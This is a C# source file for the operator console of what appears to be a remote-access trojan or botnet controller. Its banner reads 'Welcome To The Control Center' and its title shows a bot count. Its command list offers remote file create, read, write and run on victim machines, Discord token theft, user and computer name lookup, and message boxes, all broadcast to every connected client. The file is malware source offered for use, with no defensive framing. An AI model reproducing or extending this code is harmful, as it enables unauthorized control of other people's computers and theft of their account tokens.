using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;

namespace Server
{
    class Server
    {
        private static Dictionary<string, string> helpList = new Dictionary<string, string>(){
            {"stop", "stops server"},
            {"beep", "makes client beep"},
            {"getname", "returns clients computer/username"},
            {"file", "arguments: create <path>, read <path>, write <path> <text>, run <path>"},
            //{"getpath", "arguments: desktop, appdata"},
            {"gettoken", "arguments: discord"},
            { "msg", "shows a messagebox, arguments: <your message>"}
        };

        public static TCPServer server = new TCPServer();

        static void Main(String[] args)
        {
            Console.Title = $"Server (Bot Count: 0)";

            Console.ForegroundColor = ConsoleColor.DarkCyan;
            Console.WriteLine(@"   ._________________.
   |.---------------.|
   ||               ||
   ||   -._ .-.     ||
   ||   -._| | |    ||
   ||   -._|`|`|    ||
   ||   -._|.-.|    ||
   || ______________||
   /.-.-.-.-.-.-.-.-.\
  /.-.-.-.-.-.-.-.-.-.\
 /.-.-.-.-.-.-.-.-.-.-.\
/ ______ / _______\___o_\
\_______________________/");
            Console.WriteLine("\nWelcome To The Control Center");
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.WriteLine("Type 'help' for a list of commands...\n");
            Console.ForegroundColor = ConsoleColor.White;

            new Thread(() =>
            {
                server.StartServer();
            }).Start();

            string input;
            do
            {
                if (server.serverStarted == true)
                {

                    Console.Write("\r> ");
                    input = Console.ReadLine();

                    if (input.Trim().ToUpper() == "STOP")
                    {
                        break;
                    }
                    if (input.ToLower() == "help")
                    {
                        Console.Write("List of Commands: ");
                        for (int i = 0; i < helpList.Count; i++)
                        {
                            Console.ForegroundColor = ConsoleColor.Magenta;
                            Console.Write("\nCommand: ");
                            Console.ForegroundColor = ConsoleColor.White;
                            Console.Write(helpList.ElementAt(i).Key);
                            Console.ForegroundColor = ConsoleColor.Magenta;
                            Console.Write(" Info: ");
                            Console.ForegroundColor = ConsoleColor.White;
                            Console.Write($"{helpList.ElementAt(i).Value}");
                        }
                        Console.WriteLine();
                    }
                    else
                    {
                        server.SendToAllClients(input);
                    }
                }
            } while (true);

            server.StopServer();
        }
    }
}
/*
            new Thread(() =>
            {
            }).Start();
*/